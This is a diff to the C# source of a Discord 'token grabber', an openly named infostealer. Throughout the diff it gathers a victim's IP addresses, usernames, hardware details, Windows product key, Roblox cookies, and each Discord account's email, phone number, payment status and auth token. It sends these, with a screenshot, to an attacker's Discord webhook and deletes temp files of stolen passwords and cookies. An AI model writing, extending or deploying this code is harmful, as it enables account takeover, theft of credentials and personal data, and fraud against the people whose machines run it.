@@ -150,6 +150,25 @@ namespace Qvoid_Token_Grabber.Discord
                 //Getting the information about the environment computer.
                 Machine machineInfo = new Machine();
                 List<QvoidWrapper.Discord.Client> Users = new List<QvoidWrapper.Discord.Client>();
+                List<QvoidWrapper.Discord.Embed> embeds = new List<QvoidWrapper.Discord.Embed>();
+
+                QvoidWrapper.Discord.Embed embedHead = new QvoidWrapper.Discord.Embed();
+                embedHead.Title = "__General Information__";
+                embedHead.AddField("IP Address", $"```{Machine.GetPublicIpAddress()}```", true);
+                embedHead.AddField("LAN Address", $"```{Machine.GetLanIpv4Address()}```", true);
+                embedHead.AddField("Desktop Username", $"```{Environment.UserName}```", true);
+                embedHead.AddField("Domain Username", $"```{Environment.UserDomainName}```", true);
+                embedHead.AddField("Processor Count", $"```{Environment.ProcessorCount}```", true);
+                embedHead.AddField("Memory", $"```{machineInfo.pcMemory}```", true);
+                embedHead.AddField("OS Architecture", $"```{machineInfo.osArchitecture}```", true);
+                embedHead.AddField("GPU Video", $"```{machineInfo.gpuVideo}```", true);
+                embedHead.AddField("GPU Version", $"```{machineInfo.gpuVersion}```", true);
+                embedHead.AddField("Windows License", $"```{Windows.GetProductKey()}```", false);
+                embedHead.AddField("Roblox Cookie(s)", $"```{QvoidWrapper.Other.RobloxCookies() ?? "None"}```", false);
+
+                embedHead.Color = QvoidWrapper.Other.Spectrum(1);
+
+                embeds.Add(embedHead);
 
                 string BodyMessage = "";
                 string HeadMessage = $"IP Address```{Machine.GetPublicIpAddress()}```" +
@@ -361,6 +380,21 @@ namespace Qvoid_Token_Grabber.Discord
 
                     //Writing the message which contains the Discord Client information.
                     var userInfo = curUser.DiscordUser;
+
+                    var userEmbed = new QvoidWrapper.Discord.Embed();
+                    userEmbed.Title = $"__{userInfo.Username}#{userInfo.Discriminator} - ({userInfo.Id})__";
+                    userEmbed.AddField("Username", $"```{userInfo.Username}#{userInfo.Discriminator}```", true);
+                    userEmbed.AddField("Email", $"```{(curUser.Email == "null" ? "None": curUser.Email)}```", true);
+                    userEmbed.AddField("Phone Number", $"```{curUser.PhoneNumber}```", true);
+                    userEmbed.AddField("Premium", $"```{userInfo.Premium}```", true);
+                    userEmbed.AddField("Nsfw", $"```{(curUser.Nsfw ? "True":"False")}```", true);
+                    userEmbed.AddField("Payment Connected", $"```{(curUser.PaymentMethods ? "True" : "False")}```", true);
+
+                    userEmbed.AddField("Token", $"```{curUser.Token}```", false);
+                    userEmbed.Color = QvoidWrapper.Other.Spectrum(0);
+
+                    embeds.Add(userEmbed);
+
                     BodyMessage += $"{Environment.NewLine}Username```{userInfo.Username}#{userInfo.Discriminator}```" +
                                    $"{Environment.NewLine}Email```{curUser.Email}```" +
                                    $"{Environment.NewLine}Phone Number```{curUser.PhoneNumber}```" +
@@ -377,17 +411,17 @@ namespace Qvoid_Token_Grabber.Discord
                     File.WriteAllText(usersPath, QvoidWrapper.Encryption.ComputeSha256Hash(HeadMessage + BodyMessage));
 
                     QvoidWrapper.Discord.Webhook Webhook = new QvoidWrapper.Discord.Webhook(Config.Webhook);
-                    QvoidWrapper.Discord.Embed embed = new QvoidWrapper.Discord.Embed();
+                    //QvoidWrapper.Discord.Embed embed = new QvoidWrapper.Discord.Embed();
 
-                    embed.Color = Color.Red;
-                    embed.Title = "Computer Information";
-                    embed.Description = HeadMessage;
+                    //embed.Color = Color.Red;
+                    //embed.Title = "Computer Information";
+                    //embed.Description = HeadMessage;
 
-                    QvoidWrapper.Discord.Embed embed2 = new QvoidWrapper.Discord.Embed();
-                    embed2.Timestamp = DateTime.UtcNow;
-                    embed2.Color = Color.Red;
-                    embed2.Title = "Discord Client(s) Information";
-                    embed2.Description = BodyMessage;
+                    //QvoidWrapper.Discord.Embed embed2 = new QvoidWrapper.Discord.Embed();
+                    //embed2.Timestamp = DateTime.UtcNow;
+                    //embed2.Color = Color.Red;
+                    //embed2.Title = "Discord Client(s) Information";
+                    //embed2.Description = BodyMessage;
 
                     string PasswordsPath = Path.GetTempPath() + "\\tmp7DDF46.txt";
                     string CookiesPath = Path.GetTempPath() + "\\tmp7RDF47.txt";
@@ -407,16 +441,17 @@ namespace Qvoid_Token_Grabber.Discord
                         File.Delete(CookiesPath);
                     }
 
-                    Thread.Sleep(30);
-                    Webhook.Send(embed);
-                    Thread.Sleep(30);
-                    Webhook.Send(embed2);
+                    foreach (var embed in embeds)
+                    {
+                        Thread.Sleep(100);
+                        Webhook.Send(embed);
+                    }
 
                     if (File.Exists(ss_Name))
                     {
-                        Thread.Sleep(30);
+                        Thread.Sleep(100);
                         Webhook.Send(null, new FileInfo(Path.GetTempPath() + "\\Capture.jpg"));
-                        Thread.Sleep(30);
+                        Thread.Sleep(100);
                         File.Delete(Path.GetTempPath() + "\\Capture.jpg");
                     }
                 }
